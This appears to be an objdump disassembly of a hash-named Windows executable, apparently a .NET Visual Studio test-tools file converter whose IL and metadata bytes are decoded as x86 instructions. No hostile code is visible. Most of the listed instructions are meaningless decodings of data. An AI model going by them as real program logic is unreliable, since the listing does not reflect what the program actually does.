
5d2496409bc45e1e74efbc0c0802af37b26f077beb91ae8ed55ffb0cfe4bdc79.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	push   eax
  402001:	xor    al,0x0
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x22ec00
  402013:	add    al,bh
  402015:	sldt   WORD PTR [eax]
  402018:	or     eax,DWORD PTR [eax]
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    DWORD PTR [eax],eax
  40201e:	add    BYTE PTR [esi],al
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [edx+0x25],dh
  402052:	jno    0x402066
  402054:	sbb    eax,0xf123c648
  402059:	aam    0x9d
  40205b:	retf   0x32a5
  40205e:	xchg   esi,eax
  40205f:	adc    ch,BYTE PTR [edx+0xb]
  402062:	jl     0x402057
  402064:	or     dh,ah
  402066:	in     al,dx
  402067:	fsub   DWORD PTR [edx-0x1b]
  40206a:	nop
  40206b:	add    DWORD PTR [eax-0x54],edx
  40206e:	and    DWORD PTR [ebx],ebp
  402070:	push   edx
  402071:	aad    0xe7
  402073:	out    0xe6,eax
  402075:	jns    0x402007
  402077:	push   edi
  402078:	mov    esp,0x6b319e98
  40207d:	adc    ah,BYTE PTR [edi-0xd2dabc8]
  402083:	out    0x2,eax
  402085:	sbb    ch,BYTE PTR ds:0x1a4dd25c
  40208b:	es es in al,0x5c
  40208f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402090:	mov    dh,0xdc
  402092:	jbe    0x402095
  402094:	dec    edx
  402095:	push   es
  402096:	inc    esp
  402097:	push   es
  402098:	jbe    0x402076
  40209a:	div    DWORD PTR [ecx]
  40209c:	mov    dh,0xfe
  40209e:	jno    0x4020cf
  4020a0:	imul   ecx,DWORD PTR [esi+0x1b],0xffffffe6
  4020a4:	jo     0x4020f7
  4020a6:	jge    0x402105
  4020a8:	and    BYTE PTR [ebx],al
  4020aa:	out    dx,al
  4020ab:	pop    ecx
  4020ac:	cwde   
  4020ad:	repnz or ah,cl
  4020b0:	(bad)  
  4020b1:	out    dx,eax
  4020b2:	xor    bh,BYTE PTR [edx]
  4020b4:	into   
  4020b5:	out    0xba,eax
  4020b7:	or     ebx,ebp
  4020b9:	xor    ecx,DWORD PTR [ebx-0x5d8b5a97]
  4020bf:	mov    eax,ds:0x682589af
  4020c4:	adc    BYTE PTR ds:[ebx+0xe],ah
  4020c8:	loope  0x40204b
  4020ca:	sub    BYTE PTR ds:0xf9f48b4f,dl
  4020d0:	or     BYTE PTR [eax+ebx*1-0x76],0xbd
  4020d5:	push   esp
  4020d6:	inc    edi
  4020d7:	jae    0x402080
  4020d9:	std    
  4020da:	aas    
  4020db:	popa   
  4020dc:	cs mov dl,0xbd
  4020df:	jb     0x402138
  4020e1:	mov    al,0xf7
  4020e3:	sbb    DWORD PTR [ebx+eiz*2-0x53],edx
  4020e7:	and    ch,BYTE PTR [esi]
  4020e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020ea:	mov    ecx,0x82ba1881
  4020ef:	sub    bl,BYTE PTR [edx-0x4f]
  4020f2:	ror    DWORD PTR ds:0xf3f35974,cl
  4020f8:	mov    ebp,0x3ea2ba50
  4020fd:	pop    ebp
  4020fe:	pop    ebp
  4020ff:	pop    esp
  402100:	push   ds
  402101:	xchg   esp,edx
  402103:	lods   al,BYTE PTR ds:[esi]
  402104:	inc    edi
  402105:	(bad)  
  402106:	pand   mm6,QWORD PTR [ebp+0x2]
  40210a:	adc    eax,0x378c4f5d
  40210f:	sub    DWORD PTR [edx+0x19fafce3],edi
  402115:	daa    
  402116:	jp     0x4020cc
  402118:	adc    DWORD PTR cs:[esi],0xffffffac
  40211c:	into   
  40211d:	mov    bh,0x32
  40211f:	add    al,0x30
  402121:	aam    0x9b
  402123:	inc    ebp
  402124:	fidiv  WORD PTR [edi+0x70651d7e]
  40212a:	jno    0x402130
  40212c:	inc    esp
  40212d:	inc    ebx
  40212e:	scas   al,BYTE PTR es:[edi]
  40212f:	or     dl,ch
  402131:	jno    0x402180
  402133:	pop    esi
  402134:	mov    ebx,gs
  402136:	lock or BYTE PTR [edx+0x17],dh
  40213a:	push   eax
  40213b:	xchg   DWORD PTR [ebp+0x2f036ea7],edi
  402141:	arpl   WORD PTR [eax-0x5c],bx
  402144:	mov    ch,0x25
  402146:	fwait
  402147:	cmp    ch,BYTE PTR [edi+eiz*8+0x4e562aed]
  40214e:	sbb    DWORD PTR [edi+0x1b],0xe5000330
  402155:	add    BYTE PTR [eax],al
  402157:	add    BYTE PTR [ecx],al
  402159:	add    BYTE PTR [eax],al
  40215b:	adc    DWORD PTR [eax],ebp
  40215d:	add    al,BYTE PTR [eax]
  40215f:	add    BYTE PTR [esi],al
  402161:	add    cl,BYTE PTR [esi+0x5301869]
  402167:	add    cl,BYTE PTR [esi+0x28162d69]
  40216d:	add    al,0x0
  40216f:	add    BYTE PTR [esi],al
  402171:	sub    BYTE PTR ds:0x280a0000,dl
  402177:	push   ss
  402178:	add    BYTE PTR [eax],al
  40217a:	or     ch,BYTE PTR [eax]
  40217c:	pop    ss
  40217d:	add    BYTE PTR [eax],al
  40217f:	or     dl,BYTE PTR [edi]
  402181:	sub    al,BYTE PTR [edx]
  402183:	push   ss
  402184:	call   0x400:0x17e0a
  40218b:	adc    eax,DWORD PTR ds:0x2b061316
  402191:	and    edx,DWORD PTR [ecx]
  402193:	add    eax,0xb9a0611
  402198:	push   es
  402199:	pop    es
  40219a:	sbb    ebp,DWORD PTR [eax]
  40219c:	sbb    BYTE PTR [eax],al
  40219e:	add    BYTE PTR [edx],cl
  4021a0:	sub    al,0xd
  4021a2:	sub    BYTE PTR [ebx],al
  4021a4:	add    BYTE PTR [eax],al
  4021a6:	push   es
  4021a7:	push   ss
  4021a8:	adc    eax,DWORD PTR [ebx*8+0x8f]
  4021af:	adc    DWORD PTR [esi],eax
  4021b1:	pop    ss
  4021b2:	pop    eax
  4021b3:	adc    eax,DWORD PTR [esi]
  4021b5:	adc    DWORD PTR [esi],eax
  4021b7:	adc    DWORD PTR ds:0xd532698e,eax
  4021bd:	push   es
  4021be:	sub    BYTE PTR [ecx],bl
  4021c0:	add    BYTE PTR [eax],al
  4021c2:	or     ch,BYTE PTR ds:0x1a280612
  4021c8:	add    BYTE PTR [eax],al
  4021ca:	or     ch,BYTE PTR [eax]
  4021cc:	push   ss
  4021cd:	add    BYTE PTR [eax],al
  4021cf:	or     ch,BYTE PTR [eax]
  4021d1:	pop    ss
  4021d2:	add    BYTE PTR [eax],al
  4021d4:	or     dl,BYTE PTR [edi]
  4021d6:	sub    al,BYTE PTR [edx]
  4021d8:	mov    gs,WORD PTR [ecx+0x17]
  4021db:	cs add eax,0x2b9a1702
  4021e1:	add    DWORD PTR [esi],eax
  4021e3:	or     al,0x6
  4021e5:	or     BYTE PTR [eax],ch
  4021e7:	sbb    eax,DWORD PTR [eax]
  4021e9:	add    BYTE PTR [edx],cl
  4021eb:	sub    BYTE PTR [esi],dl
  4021ed:	add    BYTE PTR [eax],al
  4021ef:	or     ch,BYTE PTR [eax]
  4021f1:	pop    ss
  4021f2:	add    BYTE PTR [eax],al
  4021f4:	or     al,BYTE PTR [esi]
  4021f6:	or     BYTE PTR [eax],ch
  4021f8:	sbb    al,0x0
  4021fa:	add    BYTE PTR [edx],cl
  4021fc:	sub    al,0x11
  4021fe:	sub    BYTE PTR ds:0x280a0000,bl
  402204:	push   ss
  402205:	add    BYTE PTR [eax],al
  402207:	or     ch,BYTE PTR [eax]
  402209:	pop    ss
  40220a:	add    BYTE PTR [eax],al
  40220c:	or     ch,BYTE PTR [ebx]
  40220e:	movaps xmm3,XMMWORD PTR [esi]
  402211:	add    BYTE PTR [eax],al
  402213:	or     ch,BYTE PTR [eax]
  402215:	push   ss
  402216:	add    BYTE PTR [eax],al
  402218:	or     ch,BYTE PTR [eax]
  40221a:	pop    ss
  40221b:	add    BYTE PTR [eax],al
  40221d:	or     dl,BYTE PTR [esi]
  40221f:	adc    eax,DWORD PTR [esi+ebx*8]
  402222:	sbb    ecx,DWORD PTR ds:0x1f6f09
  402228:	add    BYTE PTR [edx],cl
  40222a:	sub    BYTE PTR [eax],ah
  40222c:	add    BYTE PTR [eax],al
  40222e:	or     ch,BYTE PTR [eax]
  402230:	push   ss
  402231:	add    BYTE PTR [eax],al
  402233:	or     ch,BYTE PTR [eax]
  402235:	pop    ss
  402236:	add    BYTE PTR [eax],al
  402238:	or     dl,BYTE PTR [edi]
  40223a:	adc    eax,DWORD PTR [esi+ebx*8]
  40223d:	add    BYTE PTR [ecx],dl
  40223f:	add    al,0x2a
  402241:	add    BYTE PTR [eax],al
  402243:	add    BYTE PTR [ecx],al
  402245:	adc    BYTE PTR [eax],al
  402247:	add    BYTE PTR [eax],al
  402249:	add    BYTE PTR [ecx+0xc72e00],bl
  40224f:	sbb    ebx,DWORD PTR [esi]
  402251:	add    BYTE PTR [eax],al
  402253:	add    DWORD PTR [ebx],edx
  402255:	xor    BYTE PTR [ecx],al
  402257:	add    BYTE PTR [esi],ah
  402259:	add    BYTE PTR [eax],al
  40225b:	add    BYTE PTR [edx],al
  40225d:	add    BYTE PTR [eax],al
  40225f:	adc    DWORD PTR [eax],ebp
  402261:	and    DWORD PTR [eax],eax
  402263:	add    BYTE PTR [edx],cl
  402265:	outs   dx,DWORD PTR ds:[esi]
  402266:	and    al,BYTE PTR [eax]
  402268:	add    BYTE PTR [edx],cl
  40226a:	sub    BYTE PTR [ebx],ah
  40226c:	add    BYTE PTR [eax],al
  40226e:	or     cl,BYTE PTR [edx]
  402270:	push   es
  402271:	outs   dx,DWORD PTR ds:[esi]
  402272:	and    al,0x0
  402274:	add    BYTE PTR [edx],cl
  402276:	sub    BYTE PTR ds:0x280a0000,ah
  40227c:	push   ss
  40227d:	add    BYTE PTR [eax],al
  40227f:	or     ch,BYTE PTR [eax]
  402281:	pop    ss
  402282:	add    BYTE PTR [eax],al
  402284:	or     ch,BYTE PTR [edx]
  402286:	push   esi
  402287:	sub    BYTE PTR [eax+eax*1],al
  40228a:	add    BYTE PTR [esi],al
  40228c:	sub    BYTE PTR [esi],ah
  40228e:	add    BYTE PTR [eax],al
  402290:	or     ch,BYTE PTR [eax]
  402292:	push   ss
  402293:	add    BYTE PTR [eax],al
  402295:	or     ch,BYTE PTR [eax]
  402297:	pop    ss
  402298:	add    BYTE PTR [eax],al
  40229a:	or     ch,BYTE PTR [edx]
  40229c:	inc    edx
  40229d:	sub    BYTE PTR [ecx],ah
  40229f:	add    BYTE PTR [eax],al
  4022a1:	or     ch,BYTE PTR [edi+0x22]
  4022a4:	add    BYTE PTR [eax],al
  4022a6:	or     ch,BYTE PTR [eax]
  4022a8:	daa    
  4022a9:	add    BYTE PTR [eax],al
  4022ab:	or     ch,BYTE PTR [edx]
  4022ad:	add    BYTE PTR [eax],al
  4022af:	add    BYTE PTR [ebx],dl
  4022b1:	xor    BYTE PTR [ebx],al
  4022b3:	add    BYTE PTR [esi],ah
  4022b5:	add    BYTE PTR [eax],al
  4022b7:	add    BYTE PTR [ebx],al
  4022b9:	add    BYTE PTR [eax],al
  4022bb:	adc    DWORD PTR [ecx],ebx
  4022bd:	lea    ebx,[edx]
  4022bf:	add    BYTE PTR [eax],al
  4022c1:	add    DWORD PTR [edx],ecx
  4022c3:	push   es
  4022c4:	push   ss
  4022c5:	jb     0x4022c8
  4022c7:	add    BYTE PTR [eax],al
  4022c9:	jo     0x40226d
  4022cb:	push   es
  4022cc:	pop    ss
  4022cd:	jb     0x4022dc
  4022cf:	add    BYTE PTR [eax],al
  4022d1:	jo     0x402275
  4022d3:	push   es
  4022d4:	sbb    BYTE PTR [edx+0x13],dh
  4022d7:	add    BYTE PTR [eax],al
  4022d9:	jo     0x40227d
  4022db:	push   es
  4022dc:	add    BYTE PTR [ecx],0x0
  4022df:	add    BYTE PTR [edx+ebp*1],al
  4022e2:	push   ds
  4022e3:	add    ch,BYTE PTR [eax]
  4022e5:	sub    BYTE PTR [eax],al
  4022e7:	add    BYTE PTR [edx],cl
  4022e9:	sub    al,BYTE PTR [eax]
  4022eb:	add    BYTE PTR [edx+0x53],al
  4022ee:	dec    edx
  4022ef:	inc    edx
  4022f0:	add    DWORD PTR [eax],eax
  4022f2:	add    DWORD PTR [eax],eax
  4022f4:	add    BYTE PTR [eax],al
  4022f6:	add    BYTE PTR [eax],al
  4022f8:	or     al,0x0
  4022fa:	add    BYTE PTR [eax],al
  4022fc:	jbe    0x402332
  4022fe:	xor    BYTE PTR cs:[esi],ch
  402301:	xor    esi,DWORD PTR [eax]
  402303:	xor    esi,DWORD PTR [ecx]
  402305:	cmp    DWORD PTR [eax],eax
  402307:	add    BYTE PTR [eax],al
  402309:	add    BYTE PTR ds:0x6c00,al
  40230f:	add    BYTE PTR [eax+0x3],ah
  402312:	add    BYTE PTR [eax],al
  402314:	and    edi,DWORD PTR [esi+0x0]
  402317:	add    ah,cl
  402319:	add    eax,DWORD PTR [eax]
  40231b:	add    BYTE PTR [esi+eax*1],dl
  40231e:	add    BYTE PTR [eax],al
  402320:	and    edx,DWORD PTR [ebx+0x74]
  402323:	jb     0x40238e
  402325:	outs   dx,BYTE PTR ds:[esi]
  402326:	addr16 jae 0x402329
  402329:	add    BYTE PTR [eax],al
  40232b:	add    al,ah
  40232d:	or     DWORD PTR [eax],eax
  40232f:	add    BYTE PTR [eax+eax*1],bl
  402332:	add    BYTE PTR [eax],al
  402334:	and    edx,DWORD PTR [ebp+0x53]
  402337:	add    ah,bh
  402339:	or     DWORD PTR [eax],eax
  40233b:	add    BYTE PTR [eax],dl
  40233d:	add    BYTE PTR [eax],al
  40233f:	add    BYTE PTR [ebx],ah
  402341:	inc    edi
  402342:	push   ebp
  402343:	dec    ecx
  402344:	inc    esp
  402345:	add    BYTE PTR [eax],al
  402347:	add    BYTE PTR [edx+ecx*1],cl
  40234a:	add    BYTE PTR [eax],al
  40234c:	in     al,dx
  40234d:	add    eax,0x42230000
  402352:	ins    BYTE PTR es:[edi],dx
  402353:	outs   dx,DWORD PTR ds:[esi]
  402354:	bound  eax,QWORD PTR [eax]
  402356:	add    BYTE PTR [eax],al
  402358:	add    BYTE PTR [eax],al
  40235a:	add    BYTE PTR [eax],al
  40235c:	add    al,BYTE PTR [eax]
  40235e:	add    BYTE PTR [ecx],al
  402360:	push   edi
  402361:	adc    eax,0x90002
  402366:	add    BYTE PTR [eax],al
  402368:	add    dl,bh
  40236a:	and    eax,0x160033
  40236f:	add    BYTE PTR [ecx],al
  402371:	add    BYTE PTR [eax],al
  402373:	add    BYTE PTR [ecx],ah
  402375:	add    BYTE PTR [eax],al
  402377:	add    BYTE PTR [edx],al
  402379:	add    BYTE PTR [eax],al
  40237b:	add    BYTE PTR [ecx],al
  40237d:	add    BYTE PTR [eax],al
  40237f:	add    BYTE PTR [esi],al
  402381:	add    BYTE PTR [eax],al
  402383:	add    BYTE PTR [ecx],al
  402385:	add    BYTE PTR [eax],al
  402387:	add    BYTE PTR [eax],ch
  402389:	add    BYTE PTR [eax],al
  40238b:	add    BYTE PTR [ebx],dl
  40238d:	add    BYTE PTR [eax],al
  40238f:	add    BYTE PTR [ebx],al
  402391:	add    BYTE PTR [eax],al
  402393:	add    BYTE PTR [ecx],al
  402395:	add    BYTE PTR [eax],al
  402397:	add    BYTE PTR [eax+eax*1],al
  40239a:	add    BYTE PTR [eax],al
  40239c:	add    BYTE PTR [eax],al
  40239e:	or     al,BYTE PTR [eax]
  4023a0:	add    DWORD PTR [eax],eax
  4023a2:	add    BYTE PTR [eax],al
  4023a4:	add    BYTE PTR [eax],al
  4023a6:	push   es
  4023a7:	add    BYTE PTR [ebx+0x0],dh
  4023aa:	ins    BYTE PTR es:[edi],dx
  4023ab:	add    BYTE PTR [esi],al
  4023ad:	add    bh,ch
  4023af:	add    ch,dl
  4023b1:	add    BYTE PTR [esi],al
  4023b3:	add    BYTE PTR [edi],ah
  4023b5:	add    DWORD PTR [eax],ecx
  4023b7:	add    DWORD PTR [esi],eax
  4023b9:	add    BYTE PTR [ebx],bh
  4023bb:	add    DWORD PTR [eax+eax*1+0x6],ebp
  4023bf:	add    BYTE PTR [ebx+0x1],ah
  4023c2:	push   ecx
  4023c3:	add    DWORD PTR [esi],eax
  4023c5:	add    BYTE PTR [edx+0x1],bh
  4023c8:	push   ecx
  4023c9:	add    DWORD PTR [esi],eax
  4023cb:	add    BYTE PTR [edi+0x6015101],dl
  4023d1:	add    BYTE PTR [ebp+0x6015101],dh
  4023d7:	add    dh,cl
  4023d9:	add    DWORD PTR [ecx+0x1],edx
  4023dc:	push   es
  4023dd:	add    bh,ah
  4023df:	add    DWORD PTR [ecx+0x1],edx
  4023e2:	push   es
  4023e3:	add    BYTE PTR [edx],al
  4023e5:	add    dl,BYTE PTR [ecx+0x1]
  4023e8:	push   es
  4023e9:	add    BYTE PTR [ebx],bl
  4023eb:	add    dl,BYTE PTR [ecx+0x1]
  4023ee:	push   es
  4023ef:	add    BYTE PTR [eax],bh
  4023f1:	add    dl,BYTE PTR [ecx+0x1]
  4023f4:	push   es
  4023f5:	add    BYTE PTR [edi+0x2],ch
  4023f8:	pop    esi
  4023f9:	add    al,BYTE PTR [esi]
  4023fb:	add    BYTE PTR [ecx+0x6025e02],dl
  402401:	add    BYTE PTR [ebx+0x6015102],dh
  402407:	add    dh,cl
  402409:	add    dl,BYTE PTR [ecx+0x1]
  40240c:	push   es
  40240d:	add    bh,ah
  40240f:	add    dl,BYTE PTR [ecx+0x1]
  402412:	push   es
  402413:	add    BYTE PTR ds:0x6030503,ah
  402419:	add    BYTE PTR [esi+0x3],dl
  40241c:	inc    ebx
  40241d:	add    edx,DWORD PTR [ebx+0x0]
  402420:	push   0x3
  402422:	add    BYTE PTR [eax],al
  402424:	push   es
  402425:	add    BYTE PTR [ecx+0x3],bh
  402428:	add    eax,0x5000a03
  40242d:	add    al,0xda
  40242f:	add    ecx,DWORD PTR [edx]
  402431:	add    BYTE PTR [esi],cl
  402433:	add    al,0xda
  402435:	add    eax,DWORD PTR [esi]
  402437:	add    BYTE PTR [esp+eax*1],dh
  40243a:	ins    BYTE PTR es:[edi],dx
  40243b:	add    BYTE PTR [esi],al
  40243d:	add    BYTE PTR [esi+0x4],al
  402440:	ins    BYTE PTR es:[edi],dx
  402441:	add    BYTE PTR [esi],al
  402443:	add    BYTE PTR [ebp+0x4],cl
  402446:	ins    BYTE PTR es:[edi],dx
  402447:	add    BYTE PTR [esi],al
  402449:	add    BYTE PTR [edi+0x4],ch
  40244c:	gs add al,0xe
  40244f:	add    dh,bh
  402451:	add    al,0xd2
  402453:	add    al,0x6
  402455:	add    BYTE PTR [ecx+0x5],dl
  402458:	ins    BYTE PTR es:[edi],dx
  402459:	add    BYTE PTR [esi],al
  40245b:	add    BYTE PTR [edx+0x5],bh
  40245e:	push   ecx
  40245f:	add    DWORD PTR [edx],edx
  402461:	add    BYTE PTR [ebp+0x6034305],ah
  402467:	add    cl,ch
  402469:	add    eax,0x465
  40246e:	add    BYTE PTR [eax],al
  402470:	add    DWORD PTR [eax],eax
  402472:	add    BYTE PTR [eax],al
  402474:	add    BYTE PTR [eax],al
  402476:	add    DWORD PTR [eax],eax
  402478:	add    DWORD PTR [eax],eax
  40247a:	add    BYTE PTR [eax],al
  40247c:	adc    BYTE PTR [eax],al
  40247e:	and    al,BYTE PTR [eax]
  402480:	add    BYTE PTR ss:0x1000100,al
  402487:	add    BYTE PTR [ecx],dh
  402489:	add    BYTE PTR [edx+0x0],bh
  40248c:	or     al,BYTE PTR [eax]
  40248e:	push   eax
  40248f:	and    DWORD PTR [eax],eax
  402491:	add    BYTE PTR [eax],al
  402493:	add    BYTE PTR [ecx+0xe008e00],dl
  402499:	add    BYTE PTR [ecx],al
  40249b:	add    BYTE PTR [edx+eiz*1+0x0],dl
  40249f:	add    BYTE PTR [eax],al
  4024a1:	add    BYTE PTR [ecx+0x14009300],dl
  4024a7:	add    BYTE PTR [edx],al
  4024a9:	add    BYTE PTR [esi+0x22],al
  4024af:	add    BYTE PTR [ecx+0x14009f00],dl
  4024b5:	add    BYTE PTR [edx],al
  4024b7:	add    BYTE PTR [edx+eiz*1+0x0],bl
  4024be:	xchg   ecx,eax
  4024bf:	add    BYTE PTR [edx+0x2001800],ch
  4024c5:	add    dl,ah
  4024c7:	and    al,BYTE PTR [eax]
  4024c9:	add    BYTE PTR [eax],al
  4024cb:	add    BYTE PTR [esi+0x1c00ca18],al
  4024d1:	add    BYTE PTR [edx],al
  4024d3:	add    BYTE PTR [eax+0x22],dh
  4024d9:	add    BYTE PTR [ecx+0x14060a18],dl
  4024df:	add    BYTE PTR [edx],al
  4024e1:	add    BYTE PTR [eax],al
  4024e3:	add    BYTE PTR [ecx],al
  4024e5:	add    al,dl
  4024e7:	add    BYTE PTR [ecx],dl
  4024e9:	add    dl,cl
  4024eb:	add    BYTE PTR [eax],ah
  4024ed:	add    BYTE PTR [ecx],bl
  4024ef:	add    dl,cl
  4024f1:	add    BYTE PTR ds:0xca002100,ah
  4024f7:	add    BYTE PTR ds:0xca002900,ah
  4024fd:	add    BYTE PTR [eax],ah
  4024ff:	add    BYTE PTR [ecx],dh
  402501:	add    dl,cl
  402503:	add    BYTE PTR [eax],ah
  402505:	add    BYTE PTR [ecx],bh
  402507:	add    dl,cl
  402509:	add    BYTE PTR [eax],ah
  40250b:	add    BYTE PTR [ecx+0x0],al
  40250e:	retf   0x2000
  402511:	add    BYTE PTR [ecx+0x0],cl
  402514:	retf   0x2000
  402517:	add    BYTE PTR [ecx+0x0],dl
  40251a:	retf   0x2000
  40251d:	add    BYTE PTR [ecx+0x0],bl
  402520:	retf   0x2000
  402523:	add    BYTE PTR [ecx+0x0],ah
  402526:	retf   0x2000
  402529:	add    BYTE PTR [ecx+0x0],ch
  40252c:	retf   0x2000
  40252f:	add    BYTE PTR [ecx+0x0],dh
  402532:	retf   0x2000
  402535:	add    BYTE PTR [ecx+0x0],bh
  402538:	retf   0x2000
  40253b:	add    BYTE PTR [ecx+0x2500ca00],al
  402541:	add    BYTE PTR [ecx+0x2000ca00],cl
  402547:	add    BYTE PTR [ecx+0x2a00ca00],dl
  40254d:	add    BYTE PTR [ecx+0x1c00ca00],bl
  402553:	add    BYTE PTR [ecx+0x3000ca00],ah
  402559:	add    BYTE PTR [ecx+0x3600ca00],dh
  40255f:	add    BYTE PTR [ecx-0x19fbe700],bh
  402565:	add    cl,al
  402567:	add    BYTE PTR [eax],ch
  402569:	add    al,0xec
  40256b:	add    cl,cl
  40256d:	add    BYTE PTR [esp+eax*1],bh
  402570:	repnz add cl,dl
  402573:	add    BYTE PTR [esi+0x4],bl
  402576:	test   DWORD PTR [eax],0x47400e1
  40257c:	inc    DWORD PTR [eax]
  40257e:	mov    ecx,0xe6047b00
  402583:	add    BYTE PTR [ecx+0x4049300],bh
  402589:	add    ecx,ebp
  40258b:	add    BYTE PTR [ebx],dl
  40258d:	add    eax,0xb9010b
  402592:	pop    ds
  402593:	add    eax,0xb90111
  402598:	cmp    BYTE PTR ds:0xf10111,al
  40259e:	pop    ebx
  40259f:	add    eax,0xb90116
  4025a4:	addr16 add eax,0xf900e6
  4025aa:	add    DWORD PTR ds:0xf90126,0xffffff98
  4025b1:	add    eax,0x1010116
  4025b6:	mov    ch,0x5
  4025b8:	sub    eax,DWORD PTR [ecx]
  4025ba:	add    DWORD PTR [ecx],eax
  4025bc:	les    eax,FWORD PTR ds:0xb90116
  4025c2:	aam    0x5
  4025c4:	out    0x0,al
  4025c6:	mov    ecx,0xe605df00
  4025cb:	add    BYTE PTR [ecx],cl
  4025cd:	add    esi,ebp
  4025cf:	add    eax,0x90138
  4025d4:	retf   0x1c00
  4025d7:	add    BYTE PTR [esi],ch
  4025d9:	add    BYTE PTR [ebx],cl
  4025db:	add    BYTE PTR [edx+0x1],al
  4025de:	add    BYTE PTR cs:[ebx],dl
  4025e1:	add    BYTE PTR [edx+0x1],bh
  4025e4:	add    BYTE PTR cs:[ebx],bl
  4025e7:	add    BYTE PTR [eax+0x23002e01],al
  4025ed:	add    BYTE PTR [esi+0x2b002e01],al
  4025f3:	add    BYTE PTR [esi+0x33002e01],al
  4025f9:	add    BYTE PTR [esi+0x3b002e01],al
  4025ff:	add    BYTE PTR [ebx+0x43002e01],ah
  402605:	add    BYTE PTR [esi+0x4b002e01],bh
  40260b:	add    ah,ah
  40260d:	add    DWORD PTR [esi],ebp
  40260f:	add    BYTE PTR [ebx+0x0],bl
  402612:	sbb    BYTE PTR [edx],al
  402614:	add    BYTE PTR cs:[ebx+0x0],ah
  402618:	sbb    BYTE PTR [edx],al
  40261a:	add    BYTE PTR cs:[ebx+0x0],ch
  40261e:	sub    al,BYTE PTR [edx]
  402620:	add    BYTE PTR cs:[ebx+0x0],dh
  402624:	cmp    BYTE PTR [edx],al
  402626:	add    BYTE PTR cs:[ebx+0x0],bh
  40262a:	add    BYTE PTR [ecx],0x2e
  40262d:	add    BYTE PTR [ebx+0x2e024300],al
  402633:	add    BYTE PTR [ebx+0x2e026e00],cl
  402639:	add    BYTE PTR [ebx+0x2e05b800],dl
  40263f:	add    BYTE PTR [ebx+0x2e05d700],bl
  402645:	add    BYTE PTR [ebx+0x1a05e000],ah
  40264b:	add    DWORD PTR [edx],esi
  40264d:	add    DWORD PTR ds:0x800401,edi
  402653:	add    BYTE PTR [ebx],cl
  402655:	add    BYTE PTR [eax],al
  402657:	add    BYTE PTR [eax],al
  402659:	add    BYTE PTR [eax],al
  40265b:	add    BYTE PTR [ecx],al
  40265d:	add    BYTE PTR [eax],al
  40265f:	add    BYTE PTR [ebx],bh
  402661:	add    BYTE PTR [ecx+0x4000003],bl
	...
  40266f:	add    BYTE PTR [eax],al
  402671:	add    BYTE PTR [ecx],al
  402673:	add    BYTE PTR [ebx+0x0],ah
  402676:	add    BYTE PTR [eax],al
  402678:	add    BYTE PTR [eax],al
  40267a:	or     eax,DWORD PTR [eax]
	...
  402684:	add    BYTE PTR [eax],al
  402686:	fld    QWORD PTR [eax]
  402688:	lods   eax,DWORD PTR ds:[esi]
  402689:	add    eax,DWORD PTR [eax]
  40268b:	add    BYTE PTR [eax],al
  40268d:	add    BYTE PTR [ebx],cl
	...
  402697:	add    BYTE PTR [eax],al
  402699:	add    ch,bl
  40269b:	add    BYTE PTR [edi+0x4],ah
  4026a1:	add    BYTE PTR [eax+eax*1],al
	...
  4026ac:	add    BYTE PTR [eax],al
  4026ae:	add    DWORD PTR [eax],eax
  4026b0:	ins    BYTE PTR es:[edi],dx
	...
  4026b9:	cmp    al,0x4d
  4026bb:	outs   dx,DWORD PTR ds:[esi]
  4026bc:	fs jne 0x40272b
  4026bf:	gs add BYTE PTR ds:[esi+0x53],dl
  4026c4:	push   esp
  4026c5:	push   ebx
  4026c6:	push   esp
  4026c7:	sub    eax,0x656c6946
  4026cc:	inc    ebx
  4026cd:	outs   dx,DWORD PTR ds:[esi]
  4026ce:	outs   dx,BYTE PTR ds:[esi]
  4026cf:	jbe    0x402736
  4026d1:	jb     0x402747
  4026d3:	gs jb  0x402704
  4026d6:	gs js  0x40273e
  4026d9:	add    BYTE PTR [esi+0x69],al
  4026dc:	ins    BYTE PTR es:[edi],dx
  4026dd:	gs inc esi
  4026df:	outs   dx,DWORD PTR ds:[esi]
  4026e0:	jb     0x40274f
  4026e2:	popa   
  4026e3:	je     0x402728
  4026e5:	outs   dx,DWORD PTR ds:[esi]
  4026e6:	outs   dx,BYTE PTR ds:[esi]
  4026e7:	jbe    0x40274e
  4026e9:	jb     0x40275f
  4026eb:	gs jb  0x4026ee
  4026ee:	dec    ebp
  4026ef:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4026f6:	je     0x402726
  4026f8:	push   esi
  4026f9:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402700:	jne    0x402766
  402702:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  402709:	push   esp
  40270a:	outs   dx,DWORD PTR ds:[esi]
  40270b:	outs   dx,DWORD PTR ds:[esi]
  40270c:	ins    BYTE PTR es:[edi],dx
  40270d:	jae    0x40273d
  40270f:	inc    ebx
  402710:	outs   dx,DWORD PTR ds:[esi]
  402711:	ins    DWORD PTR es:[edi],dx
  402712:	ins    DWORD PTR es:[edi],dx
  402713:	popa   
  402714:	outs   dx,BYTE PTR ds:[esi]
  402715:	fs dec esp
  402717:	imul   ebp,DWORD PTR [esi+0x65],0x63736d00
  40271e:	outs   dx,DWORD PTR ds:[esi]
  40271f:	jb     0x40278d
  402721:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  402728:	gs ins DWORD PTR es:[edi],dx
  40272a:	add    BYTE PTR [edi+0x62],cl
  40272d:	push   0x65
  40272f:	arpl   WORD PTR [eax+eax*1+0x48],si
  402733:	gs ins BYTE PTR es:[edi],dx
  402735:	jo     0x40277a
  402737:	outs   dx,DWORD PTR ds:[esi]
  402738:	ins    DWORD PTR es:[edi],dx
  402739:	ins    DWORD PTR es:[edi],dx
  40273a:	popa   
  40273b:	outs   dx,BYTE PTR ds:[esi]
  40273c:	fs push ebx
  40273e:	ja     0x4027a9
  402740:	je     0x4027a5
  402742:	push   0x4d007365
  402747:	popa   
  402748:	imul   ebp,DWORD PTR [esi+0x0],0x6e697250
  40274f:	je     0x402799
  402751:	gs popa 
  402753:	fs gs jb 0x402757
